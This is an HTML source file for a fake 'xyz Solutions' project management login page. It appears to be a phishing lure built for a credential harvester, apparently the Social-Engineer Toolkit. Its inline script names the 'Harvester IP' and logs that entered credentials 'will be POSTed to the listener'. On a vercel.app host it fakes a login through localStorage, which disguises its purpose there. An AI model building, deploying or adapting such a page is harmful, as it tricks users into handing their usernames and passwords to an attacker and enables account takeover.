<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login — xyz Solutions Portal</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="static/css/style.css">
</head>
<body>
    <div class="login-page">
        <div class="login-card">
            <div style="text-align: center; margin-bottom: 32px">
                <a href="index.html" class="nav-logo" style="justify-content: center; margin-bottom: 16px; color: #fff;">
                    <img src="static/assets/logo.png" alt="xyz" style="height:40px">
                    <span style="color: #fff">xyz</span>
                </a>
                <h2 style="font-size: 1.4rem; color: #fff; margin-bottom: 8px">Project Management Portal</h2>
                <p style="color: var(--text-muted); font-size: 0.85rem">Authorized Access Only</p>
            </div>

            <div id="error-message" style="display: none; padding:12px 16px; border-radius:8px; margin-bottom:16px; font-size:0.85rem; background:rgba(239,68,68,0.15); color:#fca5a5; border:1px solid rgba(239,68,68,0.3)">
                <i class="fas fa-exclamation-triangle"></i>
                Invalid username or password!
            </div>

            <form id="loginForm" method="POST" action="login.html">
                <div class="form-group">
                    <label for="username" style="color: var(--text-muted)"><i class="fas fa-user"></i> Username</label>
                    <input type="text" class="form-control" id="username" name="username" placeholder="Enter your username" required autofocus autocomplete="username">
                </div>
                <div class="form-group">
                    <label for="password" style="color: var(--text-muted)"><i class="fas fa-lock"></i> Password</label>
                    <input type="password" class="form-control" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
                </div>
                <input type="hidden" name="step" value="1">
                <div style="display:flex; align-items:center; gap:8px; margin-bottom:24px">
                    <input type="checkbox" id="remember" style="accent-color:var(--accent)">
                    <label for="remember" style="color:var(--text-muted); font-size:0.85rem; margin:0">Keep me logged in</label>
                </div>
                <button type="submit" name="submit" class="btn btn-primary" style="width:100%; padding:14px; font-weight:600; cursor:pointer; border:none">
                    Secure Login
                </button>
            </form>

            <div style="margin-top:32px; border-top:1px solid rgba(255,255,255,0.1); padding-top:24px; text-align:center; display:flex; justify-content:center; gap:24px">
                <a href="#" style="color:var(--text-muted); font-size:0.85rem"><i class="fas fa-key"></i> Reset Password</a>
                <a href="mailto:it-support@xyz.com" style="color:var(--text-muted); font-size:0.85rem"><i class="fas fa-headset"></i> IT Support</a>
            </div>
        </div>
    </div>

    <script>
        // CRITICAL: Ensure form submits naturally on the Harvester IP
        const loginForm = document.getElementById('loginForm');
        const hostname = window.location.hostname;
        
        // Only bypass if we are strictly on the Vercel production domain
        if (hostname.includes('vercel.app')) {
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();
                localStorage.setItem('loggedin', 'true');
                localStorage.setItem('username', document.getElementById('username').value || 'User');
                window.location.href = 'pm_dashboard.html';
            });
        } else {
            // Log for debugging (visible in F12 console on the harvester)
            console.log("SET Harvester detected on: " + hostname);
            console.log("Form submission is UNRESTRICTED. Credentials will be POSTed to the listener.");
        }
    </script>
</body>
</html>
